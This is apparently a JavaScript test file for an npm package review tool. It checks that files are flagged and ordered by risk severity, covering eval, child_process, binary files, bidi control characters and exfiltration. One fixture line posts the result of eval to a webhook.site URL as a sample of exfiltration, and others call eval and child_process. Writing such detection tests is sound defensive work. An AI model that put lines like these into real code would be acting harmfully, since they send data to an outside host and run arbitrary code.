import assert from 'node:assert/strict'
import { beforeEach, mock, test } from 'node:test'
import './_polyfills.js'
import { holdVersion, riskAnswer } from './_npm-risk.js'

// The real Overview's Files list, its server answers none.
mock.module('../ui/view/render.js', { namedExports: { render() {} } })
mock.module('../ui/view/dom.js', { namedExports: { report: null } })
mock.module('../ui/view/scan-navigation.js', { namedExports: { canScanBundle: () => false, openScan() {} } })
mock.module('../ui/view/ingest.js', { namedExports: { bundleKind: () => null } })
mock.module('../ui/view/tooltip.js', { namedExports: { hideTooltip() {}, installShadowTooltipListener() {}, showTooltip() {} } })
mock.module('../ui/view/dialogs/advisory-details-dialog.js', { exports: { openAdvisoryDetailsDialog() {} } })
mock.module('../ui/view/dialogs/npm-compare-advisories-dialog.js', { exports: { openNpmCompareAdvisoriesDialog() {} } })
mock.module('../ui/view/dialogs/why-dialog.js', { exports: { openWhyDialog() {} } })
// Socket's alerts on the version's files, by `name@version`.
const socket = {}
const managed = ['getPreviewRole', 'clearPreviewRole', 'resetManagedAppState', 'setManagedAppSession', 'setManagedReportCatalog', 'readReportSources', 'clearReportSources',
  'fetchReportSources', 'loadManagedBundle', 'probeSession', 'probeTeams', 'fetchManagedBundleCatalog', 'fetchNpmPackage', 'fetchRepositoryCode', 'fetchBrowsableRepositories', 'fetchRepositoryRefs', 'fetchRepositoryContents', 'fetchRepositoryHistory', 'fetchRepositoryIssues', 'fetchRepositoryAgents', 'fetchPrettyBundleFile', 'fetchPrettyBundleChanges', 'fetchPrettyNpmChanges', 'fetchPrettyNpmFile',
  'fetchPrettyNpmFiles', 'fetchBundleRenameDiff', 'fetchNpmRenameDiff', 'fetchBundleRenameDiffs', 'fetchNpmRenameDiffs', 'fetchBundleTypeOnly', 'fetchNpmTypeOnly', 'openManagedShareDialog', 'openManagedIssueDialog', 'openFindingHistoryDialog', 'fetchReport', 'fetchReports',
  'fetchTeamAnnotations', 'fetchReportTriage', 'fetchFixes', 'fetchReportComments', 'saveReportComment', 'deleteReportComment', 'pushReportTriage', 'login', 'logout', 'stopViewing',
  'fetchBundleMetadata', 'fetchBundleContents', 'fetchTeamReports', 'watchTeamFeed', 'fetchBundleAdvisories']
mock.module('../ui/view/client-managed.js', { exports: {
  ...Object.fromEntries(managed.map(name => [name, () => new Promise(() => {})])),
  fetchNpmAdvisories: () => Promise.resolve({ versions: [], advisories: [] }), fetchNpmStats: () => Promise.resolve({}),
  fetchNpmProvenance: () => Promise.resolve({ provenance: null }), fetchNpmSocket: (name, version) => Promise.resolve({ socket: socket[`${name}@${version}`] ?? null }),
  fetchNpmTags: () => Promise.resolve({ tags: [] }), fetchNpmVersions: () => Promise.resolve({ versions: [] }),
  fetchNpmRisk: (name, version, otherVersion) => Promise.resolve(riskAnswer(name, version, otherVersion)),
} })
const { byFlags } = await import('../ui/view/file-flags.js')
const { state } = await import('../client/state.ts')
const { renderBundlesList } = await import('../ui/view/render-bundle.js')
const { npmPackageDetails, npmPackageEntry } = await import('../ui/view/npm-package.js')
const { npmFileFlags } = await import('../ui/view/npm-overview.js')
const { npmRisk } = await import('../ui/view/npm-risk.js')
// A version's details, held for the server's risk (_npm-risk.js), once its
// risk has arrived.
const told = async details => { holdVersion(details, npmRisk).risk(); await new Promise(resolve => { setImmediate(resolve) }); return details }
const { fileMetaFlags } = await import('../ui/view/bundle-compare-meta.js')

const renderText = value => Array.isArray(value) ? value.map(renderText).join('')
  : value?.strings ? value.strings.map((text, i) => text + renderText(value.values[i])).join('') : typeof value === 'string' || typeof value === 'number' ? String(value) : ''

beforeEach(() => {
  state.currentView = 'bundles'
  state.bundleDetailsTab = 'overview'
  state.bundleOverviewFilesSort = 'name'
  state.managedSession = { id: `session-${Math.random()}`, role: 'view' }
})

test('Flags order: the most severe flag first, then the most flags, then their names, then the path; unflagged files last', () => {
  const flags = {
    'quiet.js': [], 'a-quiet.js': [],
    'notice.js': [{ name: 'Minified', severity: 'notice' }],
    'two-notices.js': [{ name: 'Large', severity: 'notice' }, { name: 'Minified', severity: 'notice' }],
    'warn.js': [{ name: 'eval', severity: 'high' }],
    'warn-b.js': [{ name: 'Binary', severity: 'high' }],
    'warn-a.js': [{ name: 'Binary', severity: 'high' }],
    'warn-and-notice.js': [{ name: 'Minified', severity: 'notice' }, { name: 'eval', severity: 'high' }],
    'critical.js': [{ name: 'Malware', severity: 'critical' }],
    'low.js': [{ name: 'Url strings', severity: 'low' }],
    'moderate.js': [{ name: 'Network access', severity: 'moderate' }],
  }
  assert.deepEqual(byFlags(Object.keys(flags), path => flags[path], path => path), [
    'critical.js',
    // As severe: the most flags first, then by name (Binary before eval), then by path.
    'warn-and-notice.js', 'warn-a.js', 'warn-b.js', 'warn.js',
    'moderate.js', 'low.js', 'two-notices.js', 'notice.js',
    'a-quiet.js', 'quiet.js',
  ])
})

test('a file\'s flags are what its tags show, alerts by their severity, warnings high and notices', async () => {
  const entry = npmPackageEntry({ name: 'pkg', version: '1.0.0', integrity: 'sha512-flags', manifest: {} })
  const details = await told(npmPackageDetails(entry, { files: [
    ['index.js', 40, 'module.exports = 1\n'], ['run.js', 40, 'eval(code)\nrequire("child_process")\n'], ['README.md', 10, '# pkg\n'],
    ['dist/a.min.js', 3000, `${'a;'.repeat(1500)}\n`], ['ctl.js', 10, 'x = "‮"\n'], ['logo.png', 4, null], ['send.js', 40, 'post("https://webhook.site/x", eval(code))\n'],
  ] }))
  assert.deepEqual(npmFileFlags(details, 'index.js'), [], 'none for what reads as most files do')
  assert.deepEqual(npmFileFlags(details, 'run.js'), [{ name: 'eval', severity: 'high' }, { name: 'child_process', severity: 'high' }])
  assert.deepEqual(npmFileFlags(details, 'ctl.js').map(({ name, severity }) => `${name}:${severity}`), ['Controls:high'])
  assert.deepEqual(npmFileFlags(details, 'logo.png'), [{ name: 'Binary', severity: 'high' }])
  assert.deepEqual(npmFileFlags(details, 'send.js'), [{ name: 'eval', severity: 'high' }, { name: 'Exfiltration', severity: 'critical' }], 'a host that catches what is sent to it, critical')
  assert.deepEqual(npmFileFlags(details, 'dist/a.min.js').map(({ name, severity }) => `${name}:${severity}`), ['Long lines:notice', 'Minified:notice'])
  assert.deepEqual(npmFileFlags(details, 'index.js', [{ type: 'networkAccess', severity: 'middle' }]), [{ name: 'Network access', severity: 'moderate' }], 'Socket\'s, where the list draws them')
  // What a stasis bundle records of a file, but what it no longer is.
  assert.deepEqual(fileMetaFlags([{ field: 'executable', from: false, to: true }, { field: 'entry', from: true, to: false }, { field: 'format', from: 'json', to: undefined }]),
    [{ name: '+x', severity: 'high' }, { name: 'json → none', severity: 'high' }])
})

test('the npm Overview\'s Files offer Flags where a file listed is flagged, ordered by them', async () => {
  const entry = npmPackageEntry({ name: 'flagged', version: '1.0.0', integrity: 'sha512-flagged-files', manifest: {} })
  const files = [['b.js', 40, 'module.exports = 1\n'], ['run.js', 40, 'eval(code)\n'], ['a.js', 40, 'module.exports = 2\n'], ['logo.png', 9000, null], ['z.js', 10, 'x = "‮"; eval(x)\n']]
  const render = (details, sort, shown = entry) => {
    Object.assign(state, { bundles: [shown], selectedBundle: shown.integrity, bundleDetails: details, bundleOverviewFilesSort: sort })
    const markup = renderText(renderBundlesList([shown]))
    const header = markup.match(/aria-label="File order">(.*?)<\/span>/su)[1]
    const list = [...markup.match(/<ul class="bundles-sources-list">(.*?)<\/ul>/su)[1].matchAll(/class="bundles-source-path"[^>]*>(.*?)<\/span>/gu)].map(match => match[1])
    return { header, list }
  }
  const details = await told(npmPackageDetails(entry, { files }))
  const flagged = render(details, 'flags')
  assert.match(flagged.header, /aria-pressed=false[^>]*>Name<[^]*aria-pressed=false[^>]*>Size<[^]*aria-pressed=true[^>]*>Flags</u)
  assert.deepEqual(flagged.list, ['z.js', 'logo.png', 'run.js', 'a.js', 'b.js'], 'two warnings, then Binary before eval, then the rest by path')
  assert.deepEqual(render(details, 'name').list, ['a.js', 'b.js', 'logo.png', 'run.js', 'z.js'])
  // Socket's alerts on a file, once its report arrives, as its tags show them.
  const alerted = npmPackageEntry({ name: 'alerted', version: '1.0.0', integrity: 'sha512-alerted-files', manifest: {} })
  socket['alerted@1.0.0'] = { scores: null, alerts: [{ type: 'malware', severity: 'critical', file: 'b.js' }] }
  const alertedDetails = await told(npmPackageDetails(alerted, { files }))
  render(alertedDetails, 'flags', alerted)
  await new Promise(resolve => { setImmediate(resolve) })
  assert.deepEqual(render(alertedDetails, 'flags', alerted).list, ['b.js', 'z.js', 'logo.png', 'run.js', 'a.js'], 'a critical alert first')
  // None flagged: no Flags, and Name's order where it was chosen.
  const plain = npmPackageEntry({ name: 'plain', version: '1.0.0', integrity: 'sha512-plain-files', manifest: {} })
  const quiet = render(await told(npmPackageDetails(plain, { files: [['b.js', 4, 'b\n'], ['a.js', 4, 'a\n']] })), 'flags', plain)
  assert.doesNotMatch(quiet.header, />Flags</u)
  assert.match(quiet.header, /aria-pressed=true[^>]*>Name</u)
  assert.deepEqual(quiet.list, ['a.js', 'b.js'])
})
